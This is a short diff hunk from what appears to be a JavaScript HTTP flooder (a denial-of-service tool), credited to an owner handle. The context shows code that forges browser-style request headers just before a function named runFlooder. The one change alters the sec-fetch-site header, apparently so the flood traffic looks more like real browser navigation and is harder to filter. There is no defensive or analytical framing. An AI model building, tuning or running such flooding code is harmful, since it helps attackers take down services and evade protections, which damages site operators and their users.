@@ -177,7 +177,7 @@ console.log(`Owner: @Codesyntax`);
  headers["sec-fetch-dest"] = "document";
  headers["sec-fetch-mode"] = "navigate";
  headers["x-requested-with"] = "XMLHttpRequest";
- headers["sec-fetch-site"] = "same-origin";
+ headers["sec-fetch-site"] = "none";
  headers["upgrade-insecure-requests"] = "1";
  
  function runFlooder() {
